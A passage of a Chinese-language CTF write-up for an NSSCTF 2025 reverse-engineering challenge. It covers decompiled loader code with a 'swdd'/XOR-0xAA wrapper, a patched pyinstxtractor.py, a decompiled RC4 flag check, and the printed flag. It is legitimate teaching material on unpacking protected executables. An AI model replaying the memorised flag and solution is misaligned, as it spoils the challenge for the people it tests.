 v14 = v26;<br>            <span class="hljs-keyword">goto</span> LABEL_8;<br>          &#125;<br>          <span class="hljs-keyword">break</span>;<br>        &#125;<br>      &#125;<br>      <span class="hljs-built_in">sub_140003390</span>(<span class="hljs-string">&quot;Failed to extract %s: decompression resulted in return code %d!\n&quot;</span>, (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)(a2 + <span class="hljs-number">18</span>), n2_1);<br>      <span class="hljs-keyword">goto</span> LABEL_42;<br>    &#125;<br>    <span class="hljs-keyword">if</span> ( n0x4000 &gt;= <span class="hljs-number">4</span><br>      &amp;&amp; Buffer-&gt;m128i_i8[<span class="hljs-number">0</span>] == <span class="hljs-number">0x73</span> <span class="hljs-comment">// &#x27;s&#x27;</span><br>      &amp;&amp; Buffer-&gt;m128i_i8[<span class="hljs-number">1</span>] == <span class="hljs-number">119</span> <span class="hljs-comment">// &#x27;w&#x27;</span><br>      &amp;&amp; Buffer-&gt;m128i_i8[<span class="hljs-number">2</span>] == <span class="hljs-number">100</span> <span class="hljs-comment">// &#x27;d&#x27;</span><br>      &amp;&amp; Buffer-&gt;m128i_i8[<span class="hljs-number">3</span>] == <span class="hljs-number">100</span> <span class="hljs-comment">// &#x27;d&#x27;</span><br>    )<br>    &#123;<br>      n0x4000 -= <span class="hljs-number">4LL</span>;<br>      <span class="hljs-built_in">memcpy</span>(Buffer, (<span class="hljs-type">char</span> *)Buffer-&gt;m128i_i64 + <span class="hljs-number">4</span>, n0x4000);<br>      n0x4000_4 = <span class="hljs-number">0</span>;<br>      <span class="hljs-keyword">if</span> ( n0x4000 )<br>      &#123;<br>        <span class="hljs-keyword">if</span> ( n0x4000 &lt; <span class="hljs-number">0x40</span> )<br>          <span class="hljs-keyword">goto</span> LABEL_23;<br>        v19 = Buffer + <span class="hljs-number">2</span>;<br>        <span class="hljs-keyword">do</span><br>        &#123;<br>          v20 = (__m128)_mm_loadu_si128(v19 - <span class="hljs-number">2</span>);<br>          v19 += <span class="hljs-number">4</span>;<br>          n0x4000_4 += <span class="hljs-number">64LL</span>;<br>          v19[<span class="hljs-number">-6</span>] = (<span class="hljs-type">const</span> __m128i)_mm_xor_ps(si128, v20);<br>          v19[<span class="hljs-number">-5</span>] = (<span class="hljs-type">const</span> __m128i)_mm_xor_ps((__m128)_mm_loadu_si128(v19 - <span class="hljs-number">5</span>), si128);<br>          v19[<span class="hljs-number">-4</span>] = (<span class="hljs-type">const</span> __m128i)_mm_xor_ps((__m128)_mm_loadu_si128(v19 - <span class="hljs-number">4</span>), si128);<br>          v19[<span class="hljs-number">-3</span>] = (<span class="hljs-type">const</span> __m128i)_mm_xor_ps(si128, (__m128)_mm_loadu_si128(v19 - <span class="hljs-number">3</span>));<br>        &#125;<br>        <span class="hljs-keyword">while</span> ( n0x4000_4 &lt; (n0x4000 &amp; <span class="hljs-number">0xFFFFFFFFFFFFFFC0uLL</span>) );<br>      &#125;<br>      <span class="hljs-keyword">if</span> ( n0x4000_4 &lt; n0x4000 )<br>      &#123;<br>LABEL_23:<br>        v21 = &amp;Buffer[n0x4000_4 / <span class="hljs-number">0x10</span>];<br>        v22 = n0x4000 - n0x4000_4;<br>        <span class="hljs-keyword">do</span><br>        &#123;<br>          v21-&gt;m128i_i8[<span class="hljs-number">0</span>] ^= <span class="hljs-number">0xAAu</span>;<br>          v21 = (__m128i *)((<span class="hljs-type">char</span> *)v21 + <span class="hljs-number">1</span>);<br>          --v22;<br>        &#125;<br>        <span class="hljs-keyword">while</span> ( v22 );<br>      &#125;<br>    &#125;<br>    v26 = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">goto</span> LABEL_26;<br>  &#125;<br>  v12 = <span class="hljs-built_in">errno</span>();<br>  <span class="hljs-built_in">sub_140003560</span>(<br>    <span class="hljs-string">&quot;malloc&quot;</span>,<br>    (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)*v12,<br>    <span class="hljs-string">&quot;Failed to extract %s: failed to allocate temporary input buffer!\n&quot;</span>,<br>    (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)(a2 + <span class="hljs-number">18</span>));<br>LABEL_42:<br>  <span class="hljs-built_in">sub_14000C070</span>(&amp;p_Buffer);<br>  <span class="hljs-built_in">free</span>(Buffer);<br>  <span class="hljs-built_in">free</span>(Buffer_2);<br>  <span class="hljs-keyword">return</span> v9;<br>&#125;<br></code></pre></td></tr></table></figure><p>与正常的相比，这个的主要改动在于：<br>检测首 4 字节如果是 “<strong>swdd</strong>“ 则将 buffer 向前移 4 字节（丢弃 “swdd” ）<br>数据块前 64 字节分组：每组 64 字节 &#x3D; 16B × 4，用 16B 的常量向量si128 异或，剩余不足 64 字节的部分每字节 <strong>^0xAA</strong></p><p>研究 pyinstxtractor.py 源码，修改,添加上述功能</p><p>添加处理标头 swdd 和进行 xor 的函数</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">def</span> <span class="hljs-title function_">_maybe_xor_decode</span>(<span class="hljs-params">self, data</span>):<br>    <span class="hljs-keyword">if</span> data.startswith(<span class="hljs-string">b&quot;swdd&quot;</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Detected XOR-wrapped block, decoding...&quot;</span>)<br>        data = data[<span class="hljs-number">4</span>:]  <span class="hljs-comment"># 去掉头 &quot;swdd&quot;</span><br>        data = <span class="hljs-built_in">bytes</span>([b ^ <span class="hljs-number">0xAA</span> <span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> data])<br>    <span class="hljs-keyword">return</span> data<br></code></pre></td></tr></table></figure><p>并且在 extractFiles 函数中新增了一行<br><code> data = self._maybe_xor_decode(data)</code></p><p><img src="/../images/NSS2025/k5.png"></p><p>使用修改后的 pyinstxtractor.py(完整代码贴在文末了) 重新解包，这次全部成功了</p><p><img src="/../images/NSS2025/k6.png"></p><h4 id="pyc-反编译-解密"><a href="#pyc-反编译-解密" class="headerlink" title="pyc 反编译 解密"></a>pyc 反编译 解密</h4><p>在提取出的 crack.exe_extracted 文件夹中找到 <strong>CreackMe&amp;&amp;FxxMe.pyc</strong>，在线反编译一下，得到</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># visit https://tool.lu/pyc/ for more information</span><br><span class="hljs-comment"># Version: Python 3.8</span><br><br><span class="hljs-keyword">import</span> binascii<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">arc_cipher</span>(<span class="hljs-params">data = <span class="hljs-literal">None</span>, key = <span class="hljs-literal">None</span></span>):<br>    <span class="hljs-string">&#x27;&#x27;&#x27;自实现 RC4 加密/解密&#x27;&#x27;&#x27;</span><br>    S = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))<br>    j = <span class="hljs-number">0</span><br>    key_length = <span class="hljs-built_in">len</span>(key)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        j = (j + S[i] + key[i % key_length]) % <span class="hljs-number">256</span><br>        S[i] = S[j]<br>        S[j] = S[i]<br>    i = <span class="hljs-number">0</span><br>    j = <span class="hljs-number">0</span><br>    out = <span class="hljs-built_in">bytearray</span>()<br>    <span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> data:<br>        i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span><br>        j = (j + S[i]) % <span class="hljs-number">256</span><br>        S[i] = S[j]<br>        S[j] = S[i]<br>        K = S[(S[i] + S[j]) % <span class="hljs-number">256</span>]<br>        out.append(byte ^ K)<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(out)<br><br>target_hex = <span class="hljs-string">&#x27;d29b81e136efc517c2967b863f584baf4b82f710f8869f5a56185cb22a9a25fc&#x27;</span><br>target_bytes = <span class="hljs-built_in">bytes</span>.fromhex(target_hex)<br>key = <span class="hljs-string">b&#x27;NSSCTF&#x27;</span><br>user_input = <span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;Enter input: &#x27;</span>).encode()<br>encrypted = arc_cipher(user_input, key)<br><span class="hljs-keyword">if</span> encrypted == target_bytes:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;&#x27;&#x27;Your are right, flag is NSSCTF&#123;&#123;<span class="hljs-subst">&#123;user_input.decode()&#125;</span>&#125;&#125;&#x27;&#x27;&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Wrong input&#x27;</span>)<br></code></pre></td></tr></table></figure><p>开始看到中间两行的 <code>S[i] = S[j]</code> 和 <code>S[j] = S[i]</code>以为是魔改，还去整了好一会儿爆破脚本…<br>后面直接当成标准 RC4 来处理，得到 flag 了</p><p><img src="/../images/NSS2025/k8.png"></p><p><img src="/../images/NSS2025/k7.png"></p><p>flag 为 <code>NSSCTF&#123;4984aa7eeb8c7fa0709832e364e03989&#125;</code></p><h4 id="pyinstxtractor-modified-py"><a href="#pyinstxtractor-modified-py" class="headerlink" title="pyinstxtractor_modified.py"></a>pyinstxtractor_modified.py</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> __future__ <span class="hljs-keyword">import</span> print_function<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> struct<br><span class="hljs-keyword">import</span> marshal<br><span class="hljs-keyword">import</span> zlib<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> uuid <span class="hljs-keyword">import</span> uuid4 <span class="hljs-keyword">as</span> uniquename<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">CTOCEntry</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, position, cmprsdDataSize, uncmprsdDataSize, cmprsFlag, typeCmprsData, name</span>):<br>        <span class="hljs-variable language_">self</span>.position = position<br>        <span class="hljs-variable language_">self</span>.cmprsdDataSize = cmprsdDataSize<br>        <span class="hljs-variable language_">self</span>.uncmprsdDataSize = uncmprsdDataSize<br>        <span class="hljs-variable language_">self</span>.cmprsFlag = cmprsFlag<br>        <span class="hljs-variable language_">self</span>.typeCmprsData = typeCmprsData<br>        <span class="hljs-variable language_">self</span>.name = name<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">PyInstArchive</span>:<br>    PYINST20_COOKIE_SIZE = <span class="hljs-number">24</span>           <span class="hljs-comment"># For pyinstaller 2.0</span><br>    PYINST21_COOKIE_SIZE = <span class="hljs-number">24</span> + <span class="hljs-number">64</span>      <span class="hljs-comment"># For pyinstaller 2.1+</span><br>    MAGIC = <span class="hljs-string">b&#x27;MEI\014\013\012\013\016&#x27;</span>  <span class="hljs-comment"># Magic number which identifies pyinstaller</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, path</span>):<br>        <span class="hljs-variable language_">self</span>.filePath = path<br>        <span class="hljs-variable language_">self</span>.pycMagic = <span class="hljs-string">b&#x27;\0&#x27;</span> * <span class="hljs-number">4</span><br>        <span class="hljs-variable language_">self</span>.barePycList = [] <span class="hljs-comment"># List of pyc&#x27;s whose headers have to be fixed</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">open</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-variable language_">self</span>.fPtr = <span class="hljs-built_in">open</span>(<span class="hljs-variable language_">self</span>.filePath, <span class="hljs-string">&#x27;rb&#x27;</span>)<br>            <span class="hljs-variable language_">self</span>.fileSize = os.stat(<span class="hljs-variable language_">self</span>.filePath).st_size<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[!] Error: Could not open &#123;0&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-variable language_">self</span>.filePath))<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">close</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-variable language_">self</span>.fPtr.close()<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">pass</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">checkFile</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+] Processing &#123;0&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-variable language_">self</span>.filePath))<br><br>        searchChunkSize = <span class="hljs-number">8192</span><br>        endPos = <span class="hljs-variable language_">self</span>.fileSize<br>        <span class="hljs-variable language_">self</span>.cookiePos = -<span class="hljs-number">1</span><br><br>        <span class="hljs-keyword">if</span> endPos &lt; <span class="hljs-built_in">len</span>(<span class="hljs-variable language_">self</span>.MAGIC):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[!] Error : File is too short or truncated&#x27;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            startPos = endPos - searchChunkSize <span class="hljs-keyword">if</span> endPos &gt;= searchChunkSize <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br>            chunkSize = endPos - startPos<br><br>            <span class="hljs-keyword">if</span> chunkSize &lt; <span class="hljs-built_in">len</span>(<span class="hljs-variable language_">self</span>.MAGIC):<br>                <span class="hljs-keyword">break</span><br><br>            <span class="hljs-variable language_">self</span>.fPtr.seek(startPos, os.SEEK_SET)<br>            data = <span class="hljs-variable language_">self</span>.fPtr.read(chunkSize)<br><br>            offs = data.rfind(<span class="hljs-variable language_">self</span>.MAGIC)<br><br>            <span class="hljs-keyword">if</span> offs != -<span class="hljs-number">1</span>:<br>                <span class="hljs-variable language_">self</span>.cookiePos = startPos + offs<br>                <span class="hljs-keyword">break</span><br><br>            endPos = startPos + <span class="hljs-built_in">len</span>(<span class="hljs-variable language_">self</span>.MAGIC) - <span class="hljs-number">1</span><br><br>            <span class="hljs-keyword">if</span> startPos == <span class="hljs-number">0</span>:<br>                <span class="hljs-keyword">break</span><br><br>        <span class="hljs-keyword">if</span> <span class="hljs-variable language_">self</span>.cookiePos == -<span class="hljs-number">1</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[!] Error : Missing cookie, unsupported pyinstaller version or not a pyinstaller archive&#x27;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>        <span class="hljs-variable language_">self</span>.fPtr.seek(<span class="hljs-variable language_">self</span>.cookiePos + <span class="hljs-variable language_">self</span>.PYINST20_COOKIE_SIZE, os.SEEK_SET)<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;python&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-variable language_">self</span>.fPtr.read(<span class="hljs-number">64</span>).lower():<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+] Pyinstaller version: 2.1+&#x27;</span>)<br>            <span class="hljs-variable language_">self</span>.pyinstVer = <span class="hljs-number">21</span>     <span class="hljs-comment"># pyinstaller 2.1+</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-variable language_">self</span>.pyinstVer = <span class="hljs-number">20</span>     <span class="hljs-comment"># pyinstaller 2.0</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+] Pyinstaller version: 2.0&#x27;</span>)<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">getCArchiveInfo</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">if</span> <span class="hljs-variable language_">self</span>.pyinstVer == <span class="hljs-number">20</span>:<br>                <span class="hljs-variable language_">self</span>.fPtr.seek(<span class="hljs-variable language_">self</span>.cookiePos, os.SEEK_SET)<br>                (magic, lengthofPackage, toc, tocLen, pyver) = \<br>                struct.unpack(<span class="hljs-string">&#x27;!8siiii&#x27;</span>, <span class="hljs-variable language_">self</span>.fPtr.read(<span class="hljs-variable language_">self</span>.PYINST20_COOKIE_SIZE))<br><br>            <span class="hljs-keyword">elif</span> <span class="hljs-variable language_">self</span>.pyinstVer == <span class="hljs-number">21</span>:<br>                <span class="hljs-variable language_">self</span>.fPtr.seek(<span class="hljs-variable language_">self</span>.cookiePos, os.SEEK_SET)<br>                (magic, lengthofPackage, toc, tocLen, pyver, pylibname) = \<br>                struct.unpack(<span class="hljs-string">&#x27;!8sIIii64s&#x27;</span>, <span class="hljs-variable language_">self</span>.fPtr.read(<span class="hljs-variable language_">self</span>.PYINST21_COOKIE_SIZE))<br><br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[!] Error : The file is not a pyinstaller archive&#x27;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>        <span class="hljs-variable language_">self</span>.pymaj, <span class="hljs-variable language_">self</span>.pymin = (pyver//<span class="hljs-number">100</span>, pyver%<span class="hljs-number">100</span>) <span class="hljs-keyword">if</span> pyver &gt;= <span class="hljs-number">100</span> <span class="hljs-keyword">else</span> (pyver//<span class="hljs-number">10</span>, pyver%<span class="hljs-number">10</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+] Python version: &#123;0&#125;.&#123;1&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-variable language_">self</span>.pymaj, <span class="hljs-variable language_">self</span>.pymin))<br><br>        tailBytes = <span class="hljs-variable language_">self</span>.fileSize - <span class="hljs-variable language_">self</span>.cookiePos - (<span class="hljs-variable language_">self</span>.PYINST20_COOKIE_SIZE <span class="hljs-keyword">if</span> <span class="hljs-variable language_">self</span>.pyinstVer == <span class="hljs-number">20</span> <span class="hljs-keyword">else</span> <span class="hljs-variable language_">self</span>.PYINST21_COOKIE_SIZE)<br><br>        <span class="hljs-variable language_">self</span>.overlaySize = lengthofPackage + tailBytes<br>        <span class="hljs-variable language_">self</span>.overlayPos = <span class="hljs-variable language_">self</span>.fileSize - <span class="hljs-variable language_">self</span>.overlaySize<br>        <span class="hljs-variable language_">self</span>.tableOfContentsPos = <span class="hljs-variable language_">self</span>.overlayPos + toc<br>        <span class="hljs-variable language_">self</span>.tableOfContentsSize = tocLen<br><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+] Length of package: &#123;0&#125; bytes&#x27;</span>.<span class="hljs-built_in">format</span>(lengthofPackage))<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">parseTOC</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-variable language_">self</span>.fPtr.seek(<span class="hljs-variable language_">self</span>.tableOfContentsPos, os.SEEK_SET)<br><br>        <span class="hljs-variable language_">self</span>.tocList = []<br>        parsedLen = <span class="hljs-number">0</span><br><br>        <span class="hljs-keyword">while</span> parsedLen &lt; <span class="hljs-variable language_">self</span>.tableOfContentsSize:<br>            (entrySize, ) = struct.unpack(<span class="hljs-string">&#x27;!i&#x27;</span>, <span class="hljs-variable language_">self</span>.fPtr.read(<span class="hljs-number">4</span>))<br>            nameLen = struct.calcsize(<span class="hljs-string">&#x27;!iIIIBc&#x27;</span>)<br><br>            (entryPos, cmprsdDataSize, uncmprsdDataSize, cmprsFlag, typeCmprsData, name) = \<br>            struct.unpack( \<br>                <span class="hljs-string">&#x27;!IIIBc&#123;0&#125;s&#x27;</span>.<span class="hljs-built_in">format</span>(entrySize - nameLen), \<br>                <span class="hljs-variable language_">self</span>.fPtr.read(entrySize - <span class="hljs-number">4</span>))<br><br>            <span class="hljs-keyword">try</span>:<br>                name = name.decode(<span class="hljs-string">&quot;utf-8&quot;</span>).rstrip(<span class="hljs-string">&quot;\0&quot;</span>)<br>            <span class="hljs-keyword">except</span> UnicodeDecodeError:<br>                newName = <span class="hljs-built_in">str</span>(uniquename())<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[!] Warning: File name &#123;0&#125; contains invalid bytes. Using random name &#123;1&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(name, newName))<br>                name = newName<br>            <br>            <span class="hljs-keyword">if</span> name.startswith(<span class="hljs-string">&quot;/&quot;</span>):<br>                name = name.lstrip(<span class="hljs-string">&quot;/&quot;</span>)<br><br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(name) == <span class="hljs-number">0</span>:<br>                name = <span class="hljs-built_in">str</span>(uniquename())<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[!] Warning: Found an unamed file in CArchive. Using random name &#123;0&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(name))<br><br>            <span class="hljs-variable language_">self</span>.tocList.append(CTOCEntry(<br>                <span class="hljs-variable language_">self</span>.overlayPos + entryPos,<br>                cmprsdDataSize,<br>                uncmprsdDataSize,<br>                cmprsFlag,<br>                typeCmprsData,<br>                name<br>            ))<br><br>            parsedLen += entrySize<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+] Found &#123;0&#125; files in CArchive&#x27;</span>.<span 